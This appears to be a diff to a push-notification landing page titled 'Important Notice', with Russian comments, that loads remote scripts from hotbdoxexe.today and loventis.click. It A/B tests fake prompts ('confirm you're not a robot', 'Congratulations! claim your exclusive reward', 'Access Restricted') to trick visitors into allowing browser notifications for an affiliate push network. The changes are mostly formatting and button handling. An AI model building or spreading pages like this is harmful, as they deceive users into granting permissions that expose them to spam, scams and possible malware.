@@ -2,15 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
   <meta name="robots" content="noindex, nofollow">
   <title>Important Notice</title>
 
   <!-- Основной partners.house -->
-  <script type="text/javascript" src="https://hotbdoxexe.today/process.js?id=1455554562&p1={clickid}&p2={campaign_id}&p3={country}&p4={landing_id}" async></script>
+  <script defer src="https://hotbdoxexe.today/process.js?id=1455554562&p1={clickid}&p2={campaign_id}&p3={country}&p4={landing_id}"></script>
 
   <!-- Сервис воркер -->
-  <script src="https://loventis.click/phsw3.js"></script>
+  <script defer src="https://loventis.click/phsw3.js"></script>
 
   <style>
     body {
@@ -20,6 +20,7 @@
       font-family: Arial, sans-serif;
       text-align: center;
       color: #fff;
+      padding-bottom: env(safe-area-inset-bottom);
     }
     .container {
       max-width: 500px;
@@ -55,27 +56,25 @@
     .btn:hover {
       background: #2980b9;
     }
-.footer-btn {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  width: 100%;
-  background: #1e1f2b;
-  padding: 12px;
-  box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.footer-btn .btn {
-  width: 90%;
-  max-width: 400px;
-  margin: 0 auto;
-  display: block;
-  text-align: center;
-}
-
+    .footer-btn {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100vw;
+      background: #1e1f2b;
+      padding: 12px env(safe-area-inset-left) 12px env(safe-area-inset-right);
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .footer-btn .btn {
+      width: 90%;
+      max-width: 400px;
+      margin: 0 auto;
+      display: block;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -91,33 +90,35 @@
   </div>
 
   <script>
-// A/B тест заголовков и описаний по параметру ?tx=1/2/3
-const urlParams = new URLSearchParams(window.location.search);
-const tx = urlParams.get("tx");
-const h1 = document.querySelector("h1");
-const p = document.querySelector("p");
+    // A/B тест заголовков и описаний по параметру ?tx=1/2/3
+    const urlParams = new URLSearchParams(window.location.search);
+    const tx = urlParams.get("tx");
+    const h1 = document.querySelector("h1");
+    const p = document.querySelector("p");
 
-switch (tx) {
-  case "1":
-    h1.textContent = "Verify Your Identity";
-    p.textContent = "Please confirm you're not a robot by enabling notifications.";
-    break;
-  case "2":
-    h1.textContent = "Congratulations!";
-    p.textContent = "Click \"Allow\" to claim your exclusive reward.";
-    break;
-  case "3":
-    h1.textContent = "Access Restricted";
-    p.textContent = "Enable browser notifications to continue.";
-    break;
-  default:
-    h1.textContent = "System Verification Required";
-    p.textContent = "To continue, please confirm that you're not a robot and accept important browser notifications.";
-}
-
+    switch (tx) {
+      case "1":
+        h1.textContent = "Verify Your Identity";
+        p.textContent = "Please confirm you're not a robot by enabling notifications.";
+        break;
+      case "2":
+        h1.textContent = "Congratulations!";
+        p.textContent = "Click \"Allow\" to claim your exclusive reward.";
+        break;
+      case "3":
+        h1.textContent = "Access Restricted";
+        p.textContent = "Enable browser notifications to continue.";
+        break;
+      default:
+        h1.textContent = "System Verification Required";
+        p.textContent = "To continue, please confirm that you're not a robot and accept important browser notifications.";
+    }
 
     // Логика подписки и фильтрации
     function subscribeUser() {
+      const buttons = document.querySelectorAll('.btn');
+      buttons.forEach(btn => btn.disabled = true);
+
       if (typeof window._phv2Activator !== 'undefined') {
         window._phv2Activator.activate('native_web_push');
 
@@ -131,6 +132,7 @@ switch (tx) {
 
       } else {
         alert("Push system not ready");
+        buttons.forEach(btn => btn.disabled = false);
       }
     }
   </script>
